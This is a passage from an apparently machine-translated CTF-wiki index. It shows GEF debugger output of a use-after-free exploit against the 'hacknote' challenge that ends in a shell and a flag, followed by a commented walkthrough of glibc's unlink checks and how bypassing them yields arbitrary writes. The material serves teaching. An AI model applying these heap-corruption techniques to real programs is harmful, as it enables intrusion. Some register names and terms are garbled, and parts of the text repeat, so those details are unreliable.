\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500 ['0xffffcf10', 'l8'] 8 0xffffcf10\u2502+0x00: 0x00000020 \u2190 $esp 0xffffcf14\u2502+0x04: 0xffffcf34 \u2192 0xf70a3233 0xffffcf18\u2502+0x08: 0x00000008 0xffffcf1c\u2502+0x0c: 0xf7e27260 \u2192 <atoi+16> add esp, 0x1c 0xffffcf20\u2502+0x10: 0xffffcf58 \u2192 0xffff0a31 \u2192 0x00000000 0xffffcf24\u2502+0x14: 0x00000000 0xffffcf28\u2502+0x18: 0x0000000a 0xffffcf2c\u2502+0x1c: 0x00000000 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ trace ]\u2500\u2500\u2500\u2500 ---Type <return> to continue, or q <return> to quit--- [#0] 0x8048761 \u2192 Name: add_note() [#1] 0x8048ac5 \u2192 Name: main() \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 gef\u27a4 heap chunk 0x0804b018 UsedChunk(addr=0x804b018, size=0x28) Chunk size: 40 (0x28) Usable size: 36 (0x24) Previous chunk size: 0 (0x0) PREV_INUSE flag: On IS_MMAPPED flag: Off NON_MAIN_ARENA flag: Off Similarly, we can get the address of note1 and the address of its content are 0x0804b040 and 0x0804b050 respectively. At the same time, we can also see that the content corresponding to note0 and note1 is indeed the corresponding memory block. ` asm given grip [+] Searching 'aaaa' in memory [+] In '[heap]'(0x804b000-0x806c000), permission=rw- 0x804b018 - 0x804b01c \u2192 \"aaaa\" grap daa [+] Searching 'deaa' in memory [+] In '[heap]'(0x804b000-0x806c000), permission=rw- 0x804b050 - 0x804b054 \u2192 \"good\" Here is the free process. We can find in turn that the content of note0 is free first. `` `asm \u2192 0x8048893 <del_note+143> call 0x80484c0 <free@plt> \u21b3 0x80484c0 <free@plt+0> jmp DWORD PTR ds:0x804a018 0x80484c6 <free@plt+6> push 0x18 0x80484cb <free@plt+11> jmp 0x8048480 0x80484d0 <__stack_chk_fail@plt+0> jmp DWORD PTR ds:0x804a01c \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500 ['0xffffcf20', 'l8'] 8 0xffffcf20\u2502+0x00: 0x0804b018 \u2192 \"aaaa\" \u2190 $esp Then note0 itself ` asm \u2192 0x80488a9 call 0x80484c0 free@plt \u21b3 0x80484c0 free@plt+0 jmp DWORD PTR ds:0x804a018 0x80484c6 <free@plt+6> push 0x18 0x80484cb free@plt+11 jmp 0x8048480 0x80484d0 __stack_chk_fail@plt+0 jmp DWORD PTR ds:0x804a01c \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500 ['0xffffcf20', 'l8'] 8 0xffffcf20\u2502+0x00: 0x0804b008 \u2192 0x0804865b \u2192 push ebp \u2190 $esp When the delete is over, let&#39;s take a look at the bins and we can see that it is actually stored in the corresponding fast bin. ```c++ gef\u27a4 heap bins \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ Fastbins for arena 0xf7fac780 ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 Fastbins[idx=0, size=0x8] \u2190 UsedChunk(addr=0x804b008, size=0x10) Fastbins[idx=1, size=0xc] 0x00 Fastbins[idx=2, size=0x10] 0x00 Fastbins[idx=3, size=0x14] \u2190 UsedChunk(addr=0x804b018, size=0x28) Fastbins[idx=4, size=0x18] 0x00 Fastbins[idx=5, size=0x1c] 0x00 Fastbins[idx=6, size=0x20] 0x00 After we have deleted all the note1, watch bins again. It can be seen that the chunk block deleted later is indeed in the header. ` asm gef\u27a4 heap bins \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ Fastbins for arena 0xf7fac780 ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 Fastbins[idx=0, size=0x8] \u2190 UsedChunk(addr=0x804b040, size=0x10) \u2190 UsedChunk(addr=0x804b008, size=0x10) Fastbins[idx=1, size=0xc] 0x00 Fastbins[idx=2, size=0x10] 0x00 Fastbins[idx=3, size=0x14] \u2190 UsedChunk(addr=0x804b050, size=0x28) \u2190 UsedChunk(addr=0x804b018, size=0x28) Fastbins[idx=4, size=0x18] 0x00 Fastbins[idx=5, size=0x1c] 0x00 Fastbins[idx=6, size=0x20] 0x00 Then, at this time, we will apply for note2, we can see what memory block is applied to note2, as follows **The memory block corresponding to note2 is 0x804b040, which is actually the memory address corresponding to note1. ** `` `asm [+] Heap-Analysis - malloc(8)=0x804b040 [+] Heap-Analysis - malloc(8)=0x804b040 0x080486cf in add_note () \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ registers ]\u2500\u2500\u2500\u2500 $eax : 0x0804b040 \u2192 0x0804b000 \u2192 0x00000000 $ebx : 0x00000000 $ ecx: 0xf7fac780 \u2192 0x00000000 $edx : 0x0804b040 \u2192 0x0804b000 \u2192 0x00000000 $esp : 0xffffcf10 \u2192 0x00000008 $ebp : 0xffffcf48 \u2192 0xffffcf68 \u2192 0x00000000 $ you are: 0xf7fac000 \u2192 0x001b1db0 $ edi: 0xf7fac000 \u2192 0x001b1db0 $ Eip: 0x080486cf \u2192 <add_note+89> add esp, 0x10 $cs : 0x00000023 $ss : 0x0000002b $ds : 0x0000002b $ is: 0x0000002b $fs : 0x00000000 $gs : 0x00000063 $eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code:i386 ]\u2500\u2500\u2500\u2500 0x80486c2 <add_note+76> add DWORD PTR [eax], eax 0x80486c4 <add_note+78> add BYTE PTR [ebx+0x86a0cec], al 0x80486ca <add_note+84> call 0x80484e0 <malloc@plt> \u2192 0x80486cf <add_note+89> add esp, 0x10 The memory address of the content of the note2 is 0x804b008, which is the address corresponding to note0. That is, when we write the content to the content of note2, the put field of note0 will be overwritten. ` asm gef\u27a4 n 1 [+] Heap-Analysis - malloc(8)=0x804b008 [+] Heap-Analysis - malloc(8)=0x804b008 0x08048761 in add_note () \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ registers ]\u2500\u2500\u2500\u2500 $eax : 0x0804b008 \u2192 0x00000000 $ebx : 0x0804b040 \u2192 0x0804865b \u2192 push ebp $ ecx: 0xf7fac780 \u2192 0x00000000 $edx : 0x0804b008 \u2192 0x00000000 $esp : 0xffffcf10 \u2192 0x00000008 $ebp : 0xffffcf48 \u2192 0xffffcf68 \u2192 0x00000000 $ you are: 0xf7fac000 \u2192 0x001b1db0 $ edi: 0xf7fac000 \u2192 0x001b1db0 $ Eip: 0x08048761 \u2192 add esp, 0x10 $cs : 0x00000023 $ss : 0x0000002b $ds : 0x0000002b $ is: 0x0000002b $fs : 0x00000000 $gs : 0x00000063 $eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code:i386 ]\u2500\u2500\u2500\u2500 0x8048752 <add_note+220> mov al, ds:0x458b0804 0x8048757 <add_note+225> call 0x581173df 0x804875c <add_note+230> call 0x80484e0 <malloc@plt> \u2192 0x8048761 add esp, 0x10 Let&#39;s examine it in detail. Looking at the situation before the overlay, we can see that the put pointer of the memory block has been set to NULL, which is determined by the free mechanism of fastbin. `` `asm gef\u27a4 x/2xw 0x804b008 0x804b008: 0x00000000 0x0804b018 After coverage, the specific values are as follows ` asm gef\u27a4 x/2xw 0x804b008 0x804b008: 0x08048986 0x0804b00a gef\u27a4 x/i 0x08048986 0x8048986 : push ebp It can be seen that it has indeed been covered as the magic function we want. The final execution is as follows ```shell [+] Starting local process './hacknote': pid 35030 [*] Switching to interactive mode flag{use_after_free}---------------------- HackNote ---------------------- 1. Add note 2. Delete note 3. Print note 4. Exit ---------------------- At the same time, we can also use gef's heap-analysis-helper to see the application and release of the whole heap, as follows ` asm gef\u27a4 heap-analysis-helper [*] This feature is under development, expect bugs and unstability... [+] Tracking malloc() [+] Tracking free() [+] Tracking realloc() [+] Disabling hardware watchpoints (this may increase the latency) [+] Dynamic breakpoints correctly setup, GEF will break execution if a possible vulnerabity is found. [*] Note: The heap analysis slows down noticeably the execution. gef\u27a4 c Continuing. [+] Heap-Analysis - malloc(8)=0x804b008 [+] Heap-Analysis - malloc(8)=0x804b008 [+] Heap-Analysis - malloc(32)=0x804b018 [+] Heap-Analysis - malloc(8)=0x804b040 [+] Heap-Analysis - malloc(32)=0x804b050 [+] Heap-Analysis - free(0x804b018) [+] Heap-Analysis - watching 0x804b018 [+] Heap-Analysis - free(0x804b008) [+] Heap-Analysis - watching 0x804b008 [+] Heap-Analysis - free(0x804b050) [+] Heap-Analysis - watching 0x804b050 [+] Heap-Analysis - free(0x804b040) [+] Heap-Analysis - watching 0x804b040 [+] Heap-Analysis - malloc(8)=0x804b040 [+] Heap-Analysis - malloc(8)=0x804b008 [+] Heap-Analysis - Cleaning up [+] Heap-Analysis - Re-enabling hardware watchpoints [New process 36248] process 36248 is executing new program: /bin/dash [New process 36249] process 36249 is executing new program: /bin/cat [Inferior 3 (process 36249) exited normally] ``` The first output here is twice, it should be a problem with the gef tool.","title":"Using scripts"},{"location":"pwn/linux/glibc-heap/use_after_free/#topic","text":"2016 HCTF mount","title":"topic"},{"location":"pwn/linux/glibc-heap/implementation/basic/","text":"\u57fa\u672c\u64cd\u4f5c \u00b6 unlink \u00b6 Unlink is used to take out an element in a doubly linked list (only free chunks), which may be used in the following places. malloc Get chunks from a large bin of exactly the right size. It should be noted here that fastbin and small bin do not use unlink, which is why vulnerabilities often appear here. Unlink is also not used when traversing the unsorted bin in turn. Take a chunk from the bin larger than the bin where the requested chunk is located. free Backward merge, merge physical adjacent low address free chunks. Forward merge, merge physical neighbor high address free chunks (except top chunk). malloc_consolidate Backward merge, merge physical adjacent low address free chunks. Forward merge, merge physical neighbor high address free chunks (except top chunk). realloc Forward expansion, merging physical adjacent high address free chunks (except top chunk). Since unlink is used very frequently, unlink is implemented as a macro, as follows /* Take a chunk off a bin list */ // unlink p #define unlink (AV, P, BK, FD) { // Since P is already in the doubly linked list, there are two places to record its size, so check if the size is the same. if ( __builtin_expect ( chunksize ( P ) != prev_size ( next_chunk ( P )), 0 )) \\ malloc_printerr ( \"corrupted size vs. prev_size\" ); \\ FD = P -> fd ; \\ BK = P -> bk ; \\ / / Prevent the attacker from simply tampering with the fd and bk of the free chunk to achieve arbitrary write effects . if ( __builtin_expect ( FD -> bk != P || BK -> fd != P , 0 )) \\ malloc_printerr ( check_action , \"corrupted double-linked list\" , P , AV ); \\ else { \\ FD -> bk = BK ; \\ BK -> fd = FD ; \\ / / The following mainly consider the modification of the nextsize doubly linked list corresponding to P if ( ! in_smallbin_range ( chunksize_nomask ( P )) \\ // If P->fd_nextsize is NULL, it means that P is not inserted into the nextsize list. // Then there is no need to modify the nextsize field. // There is no way to determine the bk_nextsize field, which may cause problems. && __builtin_expect ( P -> fd_nextsize != NULL , 0 )) { \\ / / Similar to the small chunk check idea if ( __builtin_expect ( P -> fd_nextsize -> bk_nextsize != P , 0 ) \\ || __builtin_expect ( P -> bk_nextsize -> fd_nextsize != P , 0 )) \\ malloc_printerr ( check_action , \\ \"corrupted double-linked list (not small)\" , \\ P , AV ); \\ // This shows that P is already in the nextsize list. // If the FD is not in the nextsize list if ( FD -> fd_nextsize == NULL ) { \\ // If the double-linked list of nextsize is only P itself, then take P directly // Let FD be a string of nextsize if ( P -> fd_nextsize == P ) \\ FD -> fd_nextsize = FD -> bk_nextsize = FD ; \\ else { \\ // Otherwise we need to insert the FD into the double-linked list formed by nextsize FD -> fd_nextsize = P -> fd_nextsize ; \\ FD -> bk_nextsize = P -> bk_nextsize ; \\ P -> fd_nextsize -> bk_nextsize = FD ; \\ P -> bk_nextsize -> fd_nextsize = FD ; \\ } \\ } else { \\ // If you are, take it straight away. P -> fd_nextsize -> bk_nextsize = P -> bk_nextsize ; \\ P -> bk_nextsize -> fd_nextsize = P -> fd_nextsize ; \\ } \\ } \\ } \\ } Here we introduce the unlink of small bin as an example. For unbin of large bin, it is similar to just one additional size. It can be seen that the final fd and bk pointers of P have not changed , but when we go through the entire doubly linked list, we have not traversed the corresponding linked list. This is not useful for change, because we can sometimes use this method to leak addresses. libc address P is located in the head of the doubly linked list, bk leaks P is located at the end of the doubly linked list, fd leaks When the doubly linked list contains only one free chunk, P is in the doubly linked list, and both fd and bk can leak. Leaked heap address, doubly linked list contains multiple free chunks P is located in the head of the doubly linked list, fd leaks P is in the doubly linked list, both fd and bk can leak P is located at the end of the doubly linked list, bk leaks note The header here refers to the chunk pointed to by the fd of bin, which is the latest chunk added in the doubly linked list. The tail here refers to the chunk pointed to by bk of bin, which is the first chunk added in the doubly linked list. At the same time, for both fd, bk and fd_nextsize, bk_nextsize, the program will check if fd and bk meet the corresponding requirements. // fd bk if ( __builtin_expect ( FD -> bk != P || BK -> fd != P , 0 )) \\ malloc_printerr ( check_action , \"corrupted double-linked list\" , P , AV ); \\ // next_size related if ( __builtin_expect ( P -> fd_nextsize -> bk_nextsize != P , 0 ) \\ || __builtin_expect ( P -> bk_nextsize -> fd_nextsize != P , 0 )) \\ malloc_printerr ( check_action , \\ \"corrupted double-linked list (not small)\" , \\ P , AV ); It seems to be normal. Let us take fd and bk as an example. The bk of the forward chunk of P is naturally P, and the fd of the backward chunk of P is also naturally P. If we do not check the corresponding, we can modify the fd and bk of P, so that the effect of writing at any address can be easily achieved. For a more detailed example, see the Unlink section of the Utilization section. Note: The prev_inuse bit recorded by the first chunk of the heap defaults to 1. malloc_printerr \u00b6 The malloc_printerr function is called when an error is detected in glibc malloc. static void malloc_printerr ( const char * str ) { __libc_message ( do_abort , \"%s \\n \" , str ); __builtin_unreachable (); } Mainly will call __libc_message to execute the abort function, as follows if (( action & do_abort )) { if (( action & do_backtrace )) BEFORE_ABORT ( do_abort , written , fd ); /* Kill the application. */ abortion (); } In the abort function, flibsh stream will be used when glibc is still 2.23. /* Flush all streams. We cannot close them now because the user might have registered a handler for SIGABRT. */ if ( stage == 1 ) { ++ stage ; fflush ( NULL ); }","title":"Basic Functions in the heap implementation"},{"location":"pwn/linux/glibc-heap/implementation/basic/#_1","text":"","title":"\u57fa\u672c\u64cd\u4f5c"},{"location":"pwn/linux/glibc-heap/implementation/basic/#unlink","text":"Unlink is used to take out an element in a doubly linked list (only free chunks), which may be used in the following places. malloc Get chunks from a large bin of exactly the right size. It should be noted here that fastbin and small bin do not use unlink, which is why vulnerabilities often appear here. Unlink is also not used when traversing the unsorted bin in turn. Take a chunk from the bin larger than the bin where the requested chunk is located. free Backward merge, merge physical adjacent low address free chunks. Forward merge, merge physical neighbor high address free chunks (except top chunk). malloc_consolidate Backward merge, merge physical adjacent low address free chunks. Forward merge, merge physical neighbor high address free chunks (except top chunk). realloc Forward expansion, merging physical adjacent high address free chunks (except top chunk). Since unlink is used very frequently, unlink is implemented as a macro, as follows /* Take a chunk off a bin list */ // unlink p #define unlink (AV, P, BK, FD) { // Since P is already in the doubly linked list, there are two places to record its size, so check if the size is the same. if ( __builtin_expect ( chunksize ( P ) != prev_size ( next_chunk ( P )), 0 )) \\ malloc_printerr ( \"corrupted size vs. prev_size\" ); \\ FD = P -> fd ; \\ BK = P -> bk ; \\ / / Prevent the attacker from simply tampering with the fd and bk of the free chunk to achieve arbitrary write effects . if ( __builtin_expect ( FD -> bk != P || BK -> fd != P , 0 )) \\ malloc_printerr ( check_action , \"corrupted double-linked list\" , P , AV ); \\ else { \\ FD -> bk = BK ; \\ BK -> fd = FD ; \\ / / The following mainly consider the modification of the nextsize doubly linked list corresponding to P if ( ! in_smallbin_range ( chunksize_nomask ( P )) \\ // If P->fd_nextsize is NULL, it means that P is not inserted into the nextsize list. // Then there is no need to modify the nextsize field. // There is no way to determine the bk_nextsize field, which may cause problems. && __builtin_expect ( P -> fd_nextsize != NULL , 0 )) { \\ / / Similar to the small chunk check idea if ( __builtin_expect ( P -> fd_nextsize -> bk_nextsize != P , 0 ) \\ || __builtin_expect ( P -> bk_nextsize -> fd_nextsize != P , 0 )) \\ malloc_printerr ( check_action , \\ \"corrupted double-linked list (not small)\" , \\ P , AV ); \\ // This shows that P is already in the nextsize list. // If the FD is not in the nextsize list if ( FD -> fd_nextsize == NULL ) { \\ // If the double-linked list of nextsize is only P itself, then take P directly // Let FD be a string of nextsize if ( P -> fd_nextsize == P ) \\ FD -> fd_nextsize = FD -> bk_nextsize = FD ; \\ else { \\ // Otherwise we need to insert the FD into the double-linked list formed by nextsize FD -> fd_nextsize = P -> fd_nextsize ; \\ FD -> bk_nextsize = P -> bk_nextsize ; \\ P -> fd_nextsize -> bk_nextsize = FD ; \\ P -> bk_nextsize -> fd_nextsize = FD ; \\ } \\ } else { \\ // If you are, take it straight away. P -> fd_nextsize -> bk_nextsize = P -> bk_nextsize ; \\ P -> bk_nextsize -> fd_nextsize = P -> fd_nextsize ; \\ } \\ } \\ } \\ } Here we introduce the unlink of small bin as an example. For unbin of large bin, it is similar to just one additional size. It can be seen that the final fd and bk pointers of P have not changed , but when we go through the entire doubly linked list, we have not traversed the corresponding linked list. This is not useful for change, because we can sometimes use this method to leak addresses. libc address P is located in the head of the doubly linked list, bk leaks P is located at the end of the doubly linked list, fd leaks When the doubly linked list contains only one free chunk, P is in the doubly linked list, and both fd and bk can leak. Leaked heap address, doubly linked list contains multiple free chunks P is located in the head of the doubly linked list, fd leaks P is in the doubly linked list, both fd and bk can leak P is located at the end of the doubly linked list, bk leaks note The header here refers to the chunk pointed to by the fd of bin, which is the latest chunk added in the doubly linked list. The tail here refers to the chunk pointed to by bk of bin, which is the first chunk added in the doubly linked list. At the same time, for both fd, bk and fd_nextsize, bk_nextsize, the program will check if fd and bk meet the corresponding requirements. // fd bk if ( __builtin_expect ( FD -> bk != P || BK -> fd != P , 0 )) \\ malloc_printerr ( check_action , \"corrupted double-linked list\" , P , AV ); \\ // next_size related if ( __builtin_expect ( P -> fd_nextsize -> bk_nextsize != P , 0 ) \\ || __builtin_expect ( P -> bk_nextsize -> fd_nextsize != P , 0 )) \\ malloc_printerr ( check_action , \\ \"corrupted double-linked list (not small)\" , \\ P , AV ); It seems to be normal. Let us take fd and bk as an example. The bk of the forward chunk of P is naturally P, and the fd of the backward chunk of P is also naturally P. If we do not check the corresponding, we can modify the fd and bk of P, so that the effect of writing at any address can be easily achieved. For a more detailed example, see the Unlink section of the Utilization section. Note: The prev_inuse bit recorded by the first chunk of the heap defaults to 1.","title":"unlink"},{"location":"pwn/linux/glibc-heap/implementation/basic/#malloc_printerr","text":"The malloc_printerr function is called when an error is detected in glibc malloc. static void malloc_printerr ( const char * str ) { __libc_message ( do_abort , \"%s \\n \" , str ); __builtin_unreachable (); } Mainly will call __libc_message to execute the abort function, as follows if (( action & do_abort )) { if 